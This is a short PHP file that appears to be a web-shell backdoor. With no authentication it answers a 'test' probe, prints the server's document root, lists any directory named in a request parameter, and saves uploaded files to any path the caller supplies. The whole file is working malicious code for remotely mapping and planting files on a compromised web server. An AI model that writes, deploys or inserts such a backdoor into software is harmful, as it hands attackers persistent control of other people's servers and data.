<?php
function GetListDir($a) {
    if (empty($a)) return null;
    $b = scandir($a);
    echo "@dir@\r\n";
    foreach ($b as $c) {
        if ($c != "." & $c != "..") {
            if (is_dir($a . "/" . $c)) echo "[" . $c . "]\r\n";
            if (is_file($a . "/" . $c)) echo "<" . $c . ">\r\n";
        }
    }
}
function UploadFile($c) {
    if (empty($c)) return null;
    if (is_uploaded_file($c["tmp_name"])) {
        if (!empty($_POST["dir"])) {
            if (move_uploaded_file($c["tmp_name"], $_POST["dir"] . "/" . $c["name"])) {
                echo "@true@\r\n";
                GetListDir($_POST["dir"]);
            }
        } else {
            if (move_uploaded_file($c["tmp_name"], $c["name"])) echo "true";
        }
    }
}
if (!empty($_GET["test"])) {
    echo "testtrue";
}
if (!empty($_GET["get_dir"])) {
    echo "|" . $_SERVER['DOCUMENT_ROOT'] . "|\r\n";
    if (!empty($_GET["dir"])) GetListDir($_GET['dir']);
}
if (!empty($_FILES["filename"])) {
    UploadFile($_FILES["filename"]);
} ?>
